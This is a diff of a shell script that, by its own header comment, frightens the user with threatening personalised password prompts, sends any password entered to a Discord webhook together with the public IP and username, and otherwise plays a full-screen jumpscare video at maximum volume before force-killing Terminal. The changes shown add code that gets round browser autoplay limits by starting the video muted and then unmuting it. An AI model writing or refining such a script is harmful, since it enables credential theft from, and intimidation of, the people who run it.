@@ -5,7 +5,7 @@
 #     "I know where you live, [FirstName]."
 #     "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
 # - If a non-empty password is entered, it sends the password, public IP,
-#   and username to a Discord webhook.
+#   and username to a Discord webhook using Ruby for JSON generation.
 # - If the user cancels (or leaves the password empty), it downloads and plays
 #   a jumpscare video (from GitHub) in the browser (full-screen, at max volume).
 # - Finally, it force-kills Terminal.
@@ -74,14 +74,17 @@ if [ -z "$password" ]; then
     </style>
   </head>
   <body>
-    <video id="video" autoplay>
+    <video id="video" autoplay muted playsinline>
       <source src="$VIDEO_URL" type="video/mp4">
       Your browser does not support the video tag.
     </video>
     <script>
       var video = document.getElementById('video');
+      // Ensure playback starts.
+      video.play();
       video.addEventListener('loadeddata', function() {
         setTimeout(function(){
+          // Request fullscreen.
           if (video.requestFullscreen) {
             video.requestFullscreen();
           } else if (video.webkitRequestFullscreen) {
@@ -89,6 +92,9 @@ if [ -z "$password" ]; then
           } else if (video.msRequestFullscreen) {
             video.msRequestFullscreen();
           }
+          // Unmute and resume playback.
+          video.muted = false;
+          video.play();
         }, 500);
       });
     </script>
